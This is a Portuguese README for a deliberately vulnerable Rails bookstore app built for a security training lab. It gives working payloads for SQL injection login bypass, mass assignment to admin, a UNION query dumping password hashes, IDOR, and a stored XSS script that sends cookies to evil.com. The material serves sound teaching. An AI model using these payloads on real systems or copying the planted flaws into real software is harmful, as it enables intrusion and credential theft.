# BookStore — App Vulnerável para Lab de Segurança Rails

> ⚠️ **AVISO:** Esta aplicação contém vulnerabilidades **intencionais**.
> Use **apenas** em ambiente de laboratório isolado. Nunca exponha para a internet.

---

## Sobre

A BookStore é uma loja de livros Rails construída propositalmente com 5 vulnerabilidades
do OWASP Top 10, usada no **Encontro 01** do curso *Segurança e Automação para Rails*.

Os alunos **atacam** a app neste encontro e **corrigem** cada vulnerabilidade no E03.

---

## Setup Rápido

```bash
git clone https://github.com/curso-rails-sec/bookstore-vulnerable.git
cd bookstore-vulnerable
bundle install
rails db:create db:migrate db:seed
rails server
```

Acesse: http://localhost:3000

### Usuários criados pelo seed

| Email                    | Senha        | Role  |
|--------------------------|--------------|-------|
| admin@bookstore.com      | password123  | admin |
| alice@user.com           | password123  | user  |
| bob@user.com             | password123  | user  |
| carol@user.com           | password123  | user  |

---

## Alternativa — Gitpod (zero install)

[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#https://github.com/curso-rails-sec/bookstore-vulnerable)

---

## Mapa de Vulnerabilidades

### 1. SQL Injection — Login (`/login`)
**Arquivo:** `app/controllers/sessions_controller.rb` — linha ~27  
**OWASP:** A03:2021 — Injection

```
email:    admin@bookstore.com' --
password: qualquercoisa
```

A query resultante comenta a verificação de senha via `--` no SQLite/PostgreSQL.

---

### 2. Mass Assignment — Cadastro (`/users`)
**Arquivo:** `app/controllers/users_controller.rb` — linha ~18  
**OWASP:** A04:2021 — Insecure Design

```bash
curl -X POST http://localhost:3000/users \
  -d "user[name]=Hacker&user[email]=h@evil.com&user[password]=123
      &user[role]=admin&user[credits]=999999"
```

O campo `role` e `credits` são atribuídos silenciosamente sem strong parameters.

---

### 3. XSS Stored — Comentários (`/books/:id`)
**Arquivo:** `app/views/books/show.html.erb` — usa `raw(comment.body)`  
**OWASP:** A03:2021 — Injection (XSS)

```html
Ótimo livro! <script>document.location='http://evil.com/c?='+document.cookie</script>
```

O script é salvo no banco e executa para todo visitante da página.

---

### 4. IDOR — Pedidos (`/orders/:id`)
**Arquivo:** `app/controllers/orders_controller.rb` — linha ~16  
**OWASP:** A01:2021 — Broken Access Control

```bash
# Logado como alice, acessar pedido do admin:
curl -b alice_cookies.txt http://localhost:3000/orders/1
```

Qualquer usuário logado acessa o pedido de qualquer outro usuário por ID.

---

### 5. SQL Injection — Busca (`/search`)
**Arquivo:** `app/controllers/books_controller.rb` — linha ~33  
**OWASP:** A03:2021 — Injection

```bash
curl "http://localhost:3000/search?q=' UNION SELECT email,password_digest,description,1,category,1,datetime('now'),datetime('now') FROM users --"
```

Retorna emails e hashes de senha de todos os usuários misturado com resultados de livros.

---

## Ferramentas para o Lab

- **curl** — requisições HTTP da linha de comando
- **Burp Suite Community** — proxy para interceptar e modificar requisições
- **OWASP ZAP** — scanner automático (usado no E08)
- **rails console** — verificar o banco após cada ataque

---

## Testes de Regressão (E03)

```bash
bundle exec rspec spec/requests/sessions_spec.rb
```

Os testes estão propositalmente falhando agora.
O objetivo do E03 é corrigir o código até todos passarem.

---

## Versões Corrigidas

Cada arquivo vulnerável contém o código seguro comentado abaixo da versão vulnerável.
Busque por `VERSÃO SEGURA` nos controllers para encontrar as correções.

---

## Estrutura do Projeto

```
bookstore/
├── app/
│   ├── controllers/
│   │   ├── application_controller.rb   # base (CSRF desabilitado ⚠)
│   │   ├── sessions_controller.rb      # SQLi vuln
│   │   ├── users_controller.rb         # mass assignment vuln
│   │   ├── books_controller.rb         # SQLi via search
│   │   ├── comments_controller.rb      # XSS stored
│   │   ├── orders_controller.rb        # IDOR
│   │   └── admin_controller.rb         # data exposure
│   ├── models/
│   │   ├── user.rb                     # SHA1 simples ⚠
│   │   └── book.rb                     # book, comment, order models
│   └── views/
│       ├── layouts/application.html.erb
│       ├── sessions/new.html.erb        # login
│       ├── users/new.html.erb           # signup
│       ├── books/{index,show}.html.erb  # XSS no show
│       ├── orders/{index,show}.html.erb # IDOR no show
│       └── admin/                       # data exposure
├── db/
│   ├── migrate/
│   ├── schema.rb
│   └── seeds.rb
└── spec/
    ├── requests/sessions_spec.rb        # testes de segurança
    └── factories/users.rb
```

---

## Referências

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [Rails Security Guide](https://guides.rubyonrails.org/security.html)
- [Brakeman Scanner](https://brakemanscanner.org/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) (gratuito)

---

*Desenvolvido para o curso Segurança e Automação para Rails — Encontro 01*
